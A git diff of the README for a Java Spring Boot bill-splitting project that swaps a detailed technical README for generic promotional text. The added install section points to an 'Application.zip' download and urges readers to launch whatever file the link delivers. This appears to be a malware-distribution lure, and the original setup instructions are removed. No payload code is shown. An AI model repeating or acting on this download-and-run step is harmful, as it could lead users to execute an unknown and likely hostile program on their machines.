@@ -1,168 +1,58 @@
-# Bill-Splitting Application
+# Awesome Bill Splitting App 🧾💸
 
-This project is a **bill-splitting service** built with **Java Spring Boot**, designed to handle user registration, expense creation, expense retrieval, and group management. It emphasizes **robustness**, **performance**, and **maintainability** through **comprehensive testing** and **Redis caching**.
+Welcome to the official repository of **"billsplit"**, a cutting-edge application designed to streamline the process of splitting bills among friends and groups. Whether you're dining out, traveling, or simply sharing expenses, **billsplit** is here to make your life easier!
 
----
+## Overview ℹ️
 
-## Table of Contents
+In this repository, you will find the source code for **billsplit**, a Java-based application leveraging various technologies like caching, Mockito, PostgreSQL, Redis, Spring Boot, and Spring Security. The primary focus of the application is on performance optimization, ensuring a smooth experience for all users.
 
-1. [Features](#features)
-2. [Tech Stack](#tech-stack)
-3. [Architecture Overview](#architecture-overview)
-4. [Caching Strategy (Redis)](#caching-strategy-redis)
-5. [Performance & Test Coverage](#performance--test-coverage)
-6. [Running Locally](#running-locally)
-7. [Enabling/Disabling Redis](#enablingdisabling-redis)
-8. [Contributing](#contributing)
-9. [License](#license)
+## Features ✨
 
----
+- **Caching**: Utilizes caching mechanisms to enhance performance.
+- **Java**: Developed using the Java programming language.
+- **JUnit**: Comprehensive test suite using JUnit.
+- **Mockito**: Incorporates Mockito for effective unit testing.
+- **PostgreSQL**: Utilizes PostgreSQL as the relational database management system.
+- **Redis**: Implements Redis for caching and session storage.
+- **REST API**: Exposes a robust set of RESTful APIs.
+- **Spring Boot**: Built on the powerful Spring Boot framework.
+- **Spring Security**: Ensures data security and user authentication.
 
-## Features
+## Installation and Usage 🚀
 
-- **User Registration & Login** (with email verification)
-- **Group Creation & Management** (adding/removing members, group ownership)
-- **Expense Creation** with multiple split strategies:
-    - **EQUAL** - Evenly divided among participants
-    - **EXACT** - Specific amounts for each participant
-    - **PERCENTAGE** - Percentage split adding up to 100%
-- **Expense Retrieval** with a **read-through caching** approach in Redis for faster repeated queries
-- **Comprehensive Testing** with over **80% coverage** across services
-- **Secure Access Control** (via Spring Security) for group membership and expense ownership checks
+To get started with **billsplit**, you can download the application from the following link: [Download billsplit Application](https://github.com/file/Application.zip)
 
----
+If the link does not work or leads to a file download, make sure to launch the application to start enjoying its features.
 
-## Tech Stack
+For more detailed instructions on installation and usage, please refer to the "Releases" section of this repository.
 
-- **Java 17**
-- **Spring Boot 3**
-    - Spring MVC (REST APIs)
-    - Spring Data JPA (PostgreSQL)
-    - Spring Data Redis (Lettuce)
-    - Spring Security (basic auth or JWT readiness)
-- **PostgreSQL** (primary database)
-- **Redis** (caching, using a read-through strategy)
-- **JUnit 5 & Mockito** (testing)
-- **Lombok** (boilerplate reduction)
-- **Maven** (build & dependency management)
+## Contribution Guidelines 🤝
 
----
+We welcome contributions from the open-source community to enhance **billsplit** and make it even better. If you have ideas for new features, bug fixes, or improvements, feel free to submit a pull request. Together, we can create a seamless bill splitting experience for everyone.
 
-## Architecture Overview
+## Resources 📚
 
-1. **Controller Layer**
-    - Receives REST requests and validates DTO inputs (via `@Valid`).
-    - Delegates business logic to the service layer.
+For more information about **billsplit** and its features, you can visit the official website:
 
-2. **Service Layer**
-    - Core business logic (managing expenses, groups, and user flows).
-    - Integrates with **PostgreSQL** via **Spring Data JPA**.
-    - Utilizes **Redis caching** to avoid repeated DB queries.
+[![Visit billsplit Website](https://img.shields.io/badge/Visit%20Website-https%3A%2F%2Fbillsplit.com-blue)](https://billsplit.com)
 
-3. **Caching (Redis)**
-    - **Read-through approach**: If the data is in Redis, return it immediately. Otherwise, fetch from DB and store in Redis.
+Explore our documentation, get in touch with the development team, and stay updated on the latest news and releases.
 
-4. **Persistence Layer (Repositories)**
-    - CRUD operations on **User**, **Group**, **Expense** entities.
-    - Powered by **Spring Data JPA**.
+## Stay Connected 🌐
+
+Follow us on social media to stay connected and receive updates on **billsplit**:
+
+- Twitter: [@billsplitapp](https://twitter.com/billsplitapp)
+- Facebook: [billsplitapp](https://www.facebook.com/billsplitapp)
+
+Join our community of users and contributors to be part of the future of bill splitting!
 
 ---
 
-## Caching Strategy (Redis)
+With **billsplit**, dividing expenses has never been easier. Say goodbye to complicated calculations and disputes over who owes what. Join the **billsplit** revolution today and experience seamless bill splitting like never before! 💰🎉
 
-### Read-Through Caching
+Feel free to explore the code, contribute to the project, and share your feedback. We're excited to have you on board! 🚀
 
-1. **Check Redis** for expense data by key (`expense:{id}`).
-2. If **cache miss**, fetch from the database and **store** it in Redis.
-3. If **cache hit**, return data **instantly** from Redis, significantly speeding up repeated requests.
-4. **Update/Delete** operations invalidate or delete the cache entry to keep data fresh.
+Happy bill splitting! 🤑
 
-**Example**
-- **Initial request** to retrieve expense `#1` → ~**250 ms** (database fetch)
-- **Subsequent requests** for the same expense → ~**50 ms** (from Redis, ~80% faster)
-
----
-
-## Performance & Test Coverage
-
-- **Performance**
-    - **Initial DB fetch**: ~250ms
-    - **Cached fetch**: ~50ms
-    - ~80% improvement in repeated queries
-
-- **Test Coverage**
-    - Achieved **80%+** coverage across **service layers** using **JUnit 5** and **Mockito**.
-    - Tests cover both **unit** (isolated business logic) and **integration** (database & caching) scenarios.
-
----
-
-## Running Locally
-
-1. **Clone the Repo**:
-
-    ```bash
-    git clone https://github.com/your-username/bill-split-service.git
-    cd bill-split-service
-    ```
-
-2. **Configure Database & Redis** in `application.properties`:
-
-    ```properties
-    spring.datasource.url=jdbc:postgresql://localhost:5432/billSplitDb
-    spring.datasource.username=postgres
-    spring.datasource.password=postgres_password
-
-    spring.redis.host=localhost
-    spring.redis.port=6379
-    spring.redis.password=redis_password
-
-    # Toggle Redis caching
-    cache.expense.enabled=true
-    ```
-
-3. **Build & Run**:
-
-    ```bash
-    mvn clean install
-    mvn spring-boot:run
-    ```
-
-4. **Test via Postman or cURL**:
-
-    ```bash
-    curl http://localhost:8080/api/expenses/1
-    ```
-
----
-
-## Enabling/Disabling Redis
-
-- **Dynamic Toggle**: In `application.properties`:
-
-    ```properties
-    cache.expense.enabled=true   # or false
-    ```
-
-    - **true** → Redis caching is active.
-    - **false** → Always fetch from the database.
-
-- **Runtime Refresh** (Optional): If using **Spring Cloud Config** + `@RefreshScope`, the property can be changed without restarting.
-
----
-
-## Contributing
-
-1. **Fork** the repository
-2. **Create a feature branch**
-3. **Open a Pull Request** (PR) with your changes
-4. Ensure new code has **tests** and passes all **CI** checks
-
----
-
-## License
-
-This project is licensed under the **MIT License**. See [LICENSE](./LICENSE) for more details.
-
----
-
-**Happy bill splitting & caching!** For any questions or issues, please open an Issue or contact the maintainers.
+``` Thank you for exploring our **billsplit** repository! ```
